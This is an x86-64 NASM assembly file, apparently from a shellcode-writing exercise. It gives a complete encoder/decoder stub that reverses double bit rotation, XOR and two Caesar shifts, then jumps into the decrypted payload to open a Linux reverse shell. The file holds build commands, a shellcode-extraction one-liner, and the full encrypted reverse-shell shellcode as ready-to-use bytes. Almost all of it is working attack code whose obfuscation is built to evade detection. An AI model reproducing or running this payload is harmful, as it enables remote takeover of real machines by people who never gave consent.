;#############################
;######## DESCRIPTION ########
;#############################

;64-bit assembler program to pop a Linux reverse shell via /bin/sh after decrypting the payload via double bitshift followed by XOR and double cesar

;#############################
;######## COMPILATION ########
;#############################

;nasm -f elf64 decipherShellcode.asm
;ld decipherShellcode.o -o decipherShellcode

;#############################
;########## PROGRAM ##########
;#############################

section .text:
	global _start

_start:
	
	jmp short uselessButEssential	;jump to uselessButEssential

	init:
		pop rsi						;get the shellcode address
		xor rbx, rbx				;set to 0 the register we use as index
		xor rcx, rcx				;set to 0 the register we use as counter
		xor rdx, rdx				;set to 0 the register we use as a counter to know which decryption function to jump to
		mov cl, 0x66				;tell our counter the size of our encrypted shellcode - 1 (here 102)

	router1:
		inc dl						;increment by 1 the counter to know which decryption function to jump to
		cmp dl, 2					;test if our counter equals 2
		je decipherROR2				;if yes we jump to decipherROR2

	decipherROR1:
		ror byte [rsi + rbx], 0x03	;do a bitshift to the right to decipher the first bitshift (here 3)
		jmp short manager1			;jump to manager1

	decipherROR2:
		ror byte [rsi + rbx], 0x05	;do a bitshift to the right to decipher the first bitshift (here 5)
		xor rdx, rdx				;set to 0 the register we use as a counter to know which decryption function to jump to

	manager1:
		add bl, 1					;increment by 1 the index
		sub cl, 1					;increment by 1 the counter
		jno router1					;if our counter doesn't have overflow it means we're not at the end of the chain so we jump to router1

	reset:
		xor rbx, rbx				;set to 0 the register we use as index
		xor rcx, rcx				;set to 0 the register we use as counter
		xor rdx, rdx				;set to 0 the register we use as a counter to know which decryption function to jump to
		mov cl, 0x66				;tell our counter the size of our encrypted shellcode - 1 (here 102)

	router2:
		inc dl						;increment by 1 the register we use as a counter to know which decryption function to jump to
		cmp dl, 2					;test if our counter equals 2
		je decipherXOR				;if yes we jump to decipherXOR
		cmp dl, 3					;else we test if out counter equals 3
		je decipherCesarMinus		;if yes we jump to decipherCesarMinus

	decipherCesarPlus:
		sub byte [rsi + rbx], 0x0d	;decrease the value of the current byte to decipher the first cesar (here 13)
		jmp short manager2			;jump to manager2

	decipherXOR:
		xor byte [rsi + rbx], 0x07	;we XOR the current byte to decipher the XOR (here 7)
		jmp short manager2			;jump to manager2

	decipherCesarMinus:
		add byte [rsi + rbx], 0x12	;we increase the value of the current byte to decipher the second cesar (here 18)
		xor rdx, rdx				;increment by 1 the register we use as a counter to know which decryption function to jump to

	manager2:
		add bl, 1					;increment by 1 the index
		sub cl, 1					;increment by 1 the counter
		jno router2					;if our counter doesn't have overflow it means we're not at the end of the chain so we jump to router1
		jmp rsi						;else we jump to our decrypted shellcode

	uselessButEssential:
		call init					;call init

;##############################
;#### SHELLCODE GENERATION ####
;##############################

;for i in `objdump -D decipherShellcode | tr '\t' ' ' | tr ' ' '\n' | egrep '^[0-9a-f]{2}$' ` ; do echo -n "\x$i" ; done ; echo

;#############################
;######### SHELLCODE #########
;#############################

;\xeb\x5c\x5e\x48\x31\xdb\x48\x31\xc9\x48\x31\xd2\xb1\x66\xfe\xc2\x80\xfa\x02\x74\x06\xc0\x0c\x1e\x03\xeb\x07\xc0\x0c\x1e\x05\x48\x31\xd2\x80\xc3\x01\x80\xe9\x01\x71\xe4\x48\x31\xdb\x48\x31\xc9\x48\x31\xd2\xb1\x66\xfe\xc2\x80\xfa\x02\x74\x0b\x80\xfa\x03\x74\x0c\x80\x2c\x1e\x0d\xeb\x0d\x80\x34\x1e\x07\xeb\x07\x80\x04\x1e\x12\x48\x31\xd2\x80\xc3\x01\x80\xe9\x01\x71\xd9\xff\xe6\xe8\x9f\xff\xff\xff (99 bytes)

;#############################
;######### SHELLCODE #########
;############# + #############
;######### ENCRYPTED #########
;######### SHELLCODE #########
;######### CESAR +13 #########
;########### XOR 7 ###########
;######### CESAR -18 #########
;########### ROL 3 ###########
;########### ROL 5 ###########
;#############################

;\xeb\x5c\x5e\x48\x31\xdb\x48\x31\xc9\x48\x31\xd2\xb1\x66\xfe\xc2\x80\xfa\x02\x74\x06\xc0\x0c\x1e\x03\xeb\x07\xc0\x0c\x1e\x05\x48\x31\xd2\x80\xc3\x01\x80\xe9\x01\x71\xe4\x48\x31\xdb\x48\x31\xc9\x48\x31\xd2\xb1\x66\xfe\xc2\x80\xfa\x02\x74\x0b\x80\xfa\x03\x74\x0c\x80\x2c\x1e\x0d\xeb\x0d\x80\x34\x1e\x07\xeb\x07\x80\x04\x1e\x12\x48\x31\xd2\x80\xc3\x01\x80\xe9\x01\x71\xd9\xff\xe6\xe8\x9f\xff\xff\xff\xab\x0f\x7f\xe2\x1b\x8a\xab\xaf\xba\x6e\x6b\x1e\xaa\xc6\x06\xaa\xb1\x9c\x6a\x36\x7f\xaa\xb1\xbd\x6a\x16\x87\xaa\xb1\xd5\xed\xc5\xef\x42\x7a\xe3\xfe\xb6\xff\xaa\x54\x44\x89\xe9\xbb\x9a\x7a\xe3\x6e\xf6\xc0\x83\x10\xc6\xf1\x3e\xf4\xc5\x40\x7e\x6a\x3f\xa5\xb7\x31\xbf\x90\xe8\x67\x7a\xbd\xe1\xe0\x40\xb1\x99\x41\xa3\x7b\xcd\xe2\x87\xa3\xca\xaa\xc6\x27\x6c\x82\xc6\xf1\xba\xb1\x53\xd9\x42\xaa\xc6\x75\xb7\xe1\xbf\x90 (202 bytes)
